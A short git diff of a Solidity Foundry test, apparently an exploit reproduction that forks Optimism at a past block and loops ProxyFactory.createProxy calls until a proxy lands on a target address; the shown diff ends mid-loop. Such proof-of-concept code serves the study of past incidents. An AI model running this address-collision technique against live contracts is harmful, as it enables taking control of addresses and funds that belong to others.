@@ -2,7 +2,7 @@
 pragma solidity 0.8.10;
 
 import "ds-test/test.sol";
-
+import "./interface.sol";
 interface ProxyFactory {
      function createProxy(address masterCopy, bytes calldata data) external returns (address payable proxy);
 }
@@ -10,7 +10,15 @@ interface ProxyFactory {
 contract ContractTest is DSTest {
     ProxyFactory proxy = ProxyFactory(0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B);
     address public childcontract;
-    function testExample() public {
+    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+    uint256 mainnetFork;
+    
+    function setUp() public {
+        mainnetFork = cheats.createFork("https://rpc.ankr.com/optimism", 10607735); //fork optimism at block 10607735
+        cheats.selectFork(mainnetFork);
+    }
+
+    function testExploit() public {
 
     while (childcontract != 0x4f3a120E72C76c22ae802D129F599BFDbc31cb81 ) {
     childcontract = proxy.createProxy(0xE7145dd6287AE53326347f3A6694fCf2954bcD8A,"0x");
